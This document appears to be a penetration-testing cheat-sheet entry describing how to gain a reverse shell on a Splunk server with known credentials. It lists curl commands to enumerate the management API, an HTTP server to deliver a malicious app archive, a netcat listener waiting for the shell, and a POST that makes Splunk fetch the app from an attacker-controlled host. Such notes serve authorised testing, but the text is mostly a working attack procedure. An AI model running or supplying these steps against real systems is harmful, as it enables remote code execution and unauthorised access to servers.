# splunk

## splunk app: reverse shell

Prerequisite: user:password

Steps:

1. Find the endpoint

        $ curl -k -X GET -u <user>:<password> https://<ip>:8089/services/apps/
        <?xml version="1.0" encoding="UTF-8"?>
            <generator build="XXX" version="8.0.5"/>
            <author>
              <name>Splunk</name>
            </author>
            ...
            <link href="/services/apps//local/_new" rel="create"/>
            <link href="/services/apps//local" rel="list"/>
            <link href="/services/apps//local/_reload" rel="_reload"/>
            ...

        $ curl -k -X GET -u <user>:<password> https://<ip>:8089/services/apps//local/_new
        <?xml version="1.0" encoding="UTF-8"?>
            ...
            <s:key name="write">
              <s:list>
                <s:item>admin</s:item>
                <s:item>splunk-system-role</s:item>
              </s:list>
            </s:key>
            ...

2. Define the app

        # https://github.com/binarytrails/pentest/tree/master/src/exploits/multiple/splunk/splunk_app_rshell
        splunk_app_rshell/
        ├── bin
        │   └── code.py
        └── default
            └── inputs.conf

3. Start listeners

    python -m http.server 8080  # to deliver the app.tar.gz
    nc -l -v -p 6666            # for a reverse shell connection

4. Upload the app

    $ tar -zcvf splunk_app.tar.gz ./splunk_app_rshell
    $ curl -k -X POST -u <user>:<password> https://<ip>:8089/services/apps//local \
        -d filename=True \
        -d name=http://<attacker-ip>:8080/splunk_app.tar.gz \
        -d visible=True

